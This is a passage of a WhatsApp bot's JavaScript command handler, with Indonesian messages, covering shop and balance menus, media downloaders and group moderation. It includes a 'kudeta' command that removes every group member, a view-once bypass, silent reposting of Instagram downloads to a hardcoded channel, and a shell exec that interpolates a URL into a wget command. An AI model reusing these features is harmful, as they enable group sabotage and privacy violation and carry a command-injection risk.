const Kalender0001 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
Reply(`*INFO SALDO ANDA*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
Note : anda hanya bisa melakukan pembelian di bot asuma saja, ketik *.shop menu* untuk berbelanja`)
}
break

case"shop": case "menushop": case "shopmenu": case "belanja":
 Ditss.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 2500000 * 1000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: `

 👋 _*S H O P*_ 乂

> • _.nokos_ 
> • _.5gb_
> • _.10gb_
> • _.vps_
> • _.transfer_
> • _.beli-sc_
> • _.beli-prem_ (10k)
> • _.addsewa_ (12k)
> • _.giveaway_
> • _.addsaldo_ 
> • _.saldo_
> • _.ceksaldo_
`,
 contextInfo: {
 mentionedJid: 'p',
 externalAdReply: {
 showAdAttribution: true
 }
 }
 }
 }
 }
 }, {})
let kuppp = await Ditss.profilePictureUrl(`${nomore}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
let solsoundd = await getBuffer('https://telegra.ph/file/b4082cd207d7e88c34eaf.jpg')
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `delever script`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:asuma;Bot;;;\nFN:Asuma Bot\nTEL;type=Mobile;waid=6285882135288:+62 858-8213-5288\nEND:VCARD",
}
}), { userJid: m.chat, quoted: m })
//Ditss.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break

case 'acc': case 'addsaldo':{
if (!isCreator) return Reply(`*[ System Notice ]* User tidak bisa aksess command ini`)
const Kalender000 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
if (!q.split(",")[0]) return Reply(`Ex : ${prefix+command} ${nomore},20000`)
if (!q.split(",")[1]) return Reply(`Ex : ${prefix+command} ${nomore},2000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(1000)
Reply(`*USER SALDO*
 • ID : ${sender.split("@")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender000}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))} `)
 }
case 'kirim': {
if (!isCreator) return Reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
let messageText = `Operasi *Topup* sebanyak Rp. ${q.split(",")[1]} suksess, ketik *.saldo* untuk melihat info anda`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

Ditss.sendMessage(targetNumber, {
text: `${messageText}`,
mentions: [sender]
}, {
quoted: m
}).then(() => {
Reply('Berhasil ✓');
}).catch(() => {
m.reply('Gagal mengirim pesan!');
});
}
break;
        //plerr
case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "ytss": {
if (!text) return m.reply(example('we dont talk'))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

        case "ytmp3": {
            if (!text) return m.reply("Masukkan link YouTube!");
            if (!text.startsWith("https://")) return m.reply("Link tidak valid!");

            await Ditss.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

            try {
                console.log("DEBUG: Mengambil data dari ytdl dengan link:", text);

                let info = await ytdl.getInfo(text);
                let format = ytdl.chooseFormat(info.formats, { quality: "highestaudio" });

                if (!format || !format.url) return m.reply("Error! Lagu tidak ditemukan.");

                console.log("DEBUG: URL Audio =", format.url);

                let outputPath = "./temp/audio.mp3"; // Simpan sebagai MP3
                let tempPath = "./temp/audio.webm"; // Simpan sementara

                // Download audio dalam format WebM
                exec(`wget -O ${tempPath} "${format.url}"`, async (err) => {
                    if (err) {
                        console.error("DEBUG: Error saat download audio:", err);
                        return m.reply("Terjadi kesalahan saat mengunduh audio.");
                    }

                    // Konversi ke MP3 menggunakan ffmpeg
                    ffmpeg(tempPath)
                        .toFormat("mp3")
                        .on("end", async () => {
                            console.log("DEBUG: Konversi selesai, mengirim audio...");
                            await Ditss.sendMessage(m.chat, { 
                                audio: fs.readFileSync(outputPath), 
                                mimetype: "audio/mpeg" 
                            }, { quoted: m });

                            fs.unlinkSync(tempPath); // Hapus file WebM
                            fs.unlinkSync(outputPath); // Hapus file MP3
                        })
                        .on("error", (err) => {
                            console.error("DEBUG: Error saat konversi ffmpeg:", err);
                            return m.reply("Terjadi kesalahan saat mengonversi audio.");
                        })
                        .save(outputPath);
                });
            } catch (error) {
                console.error("DEBUG: Error pada ytmp3:", error);
                return m.reply("Terjadi kesalahan saat mengambil audio.");
            }
        }
        break;

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

/*case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
//if (!res.link) return m.reply("Error! Result Not Found")
await Ditss.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break
*/
case 'mediafire':{
  if (!text) return reply(`*Example:* ${prefix} mediafire https://www.mediafire.com/file/0rapm6bphlnbg18/asuma-apdateV2.8.zip/file`);
    
    try {
        const response = await fetch(`https://restapi.apibotwa.biz.id/api/mediafire?url=${encodeURIComponent(text)}`);
        const json = await response.json();
        
        if (!json.data.response) return reply('Failed to fetch!');
        
        const { download, filename, size, type, uploaded, mimetype } = json.data.response;
        
        let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${size}
*🗂️ Extension:* ${type}
*📨 Uploaded:* ${uploaded}
`.trim();
        
        m.reply(caption);
       
    await Ditss.sendMessage(m.chat, { document: { url: download }, mimetype: mimetype || "application/octet-stream", fileName: filename }, { quoted: m });
        
    } catch (error) {
        throw error
    }
};
break
//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Ditss.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

//================================================================================

 case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
     let momok = "Instagram downloader"
	  if (!text) return Reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  try {
    let ress = await fetch(`https://api.neekoi.me/api/igdl?url=${args[0]}`);
    let res = await ress.json();
    await //Ditss.sendMessage(from, {video: {url: res.result.data[0].url}})
await Ditss.sendMessage(m.chat,{
			 video: {url:res.result.data[0].url},
					caption: momok,
					footer: `\n${global.botname2}`,
					buttons: [
						{
							buttonId: `.toaudio`,
							buttonText: {
								displayText: "back sound"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
      await Ditss.sendMessage(`1203632329679938@newsletter`, {video: {url: res.result.data[0].url}})
  } catch (error) {
    return Reply(`An error occurred: ${error.message}`)
  }
}
break
//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Ditss.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case "tt": case "tiktok": {
let momok = "`tiktok downloader✓`"
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Ditss.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Ditss.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")

await Ditss.sendMessage(m.chat,{
			 video: {url:urlVid.url},
					caption: momok,
					footer: `\n${global.botname2}`,
					buttons: [
						{
							buttonId: `.ttmp3 ${text}`,
							buttonText: {
								displayText: "back sound"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
}).catch(e => console.log(e))
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await Ditss.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Ditss.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Ditss.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Ditss.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================
case "delpremium": case "delprem": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus premium owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan user premium!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus premium ✅`)
}
break
//===
case"pin-asuma": case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Ditss.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Ditss.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

/*case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://btch.us.kg/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Asuma-Ai%20dan%20di20%ciptakan%20oleh%20Ditss&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//================================================================================

/*case "brat": {
if (!text) return m.reply(example('teksnya'))
let res = await getBuffer(`https://btch.us.kg/brat?text=${text}`)
await Ditss.sendAsSticker(m.chat, res, m, {packname: global.packname})
}
break
*/
//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Ditss.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Ditss.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Ditss.downloadAndSaveMediaMessage(qmsg)
await Ditss.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Ditss.downloadAndSaveMediaMessage(qmsg)
await Ditss.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Ditss.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Ditss.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Ditss.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Ditss.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'ditss.png');

let teks = directLink.toString()
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Ditss.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'ditss.png');
let teks = directLink.toString()
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await Ditss.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Ditss.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Ditss.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Ditss.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case'dor': case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Ditss.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Ditss.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Ditss.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Ditss.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Ditss.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Ditss.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Ditss.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Ditss.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Ditss.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Ditss.newsletterMetadata("invite", result)
await Ditss.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Ditss.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Ditss.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break
//===
case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.admin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
Ditss.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {
if (!m?.isGroup) return reply("Khusus Dalam Group")
if (!isAdmins && !isCreator) return reply("Khusus Admin Group")
if (!isBotAdmins) return reply("Jadikan Bot Sebagai Admin Terlebih Dahulu Jika Ingin Menggunakan Fitur Ini")
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
Ditss.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
break
//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Asuma Starting 🔥")
for (let i of memberFilter) {
await Ditss.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Ditss.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Ditss.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
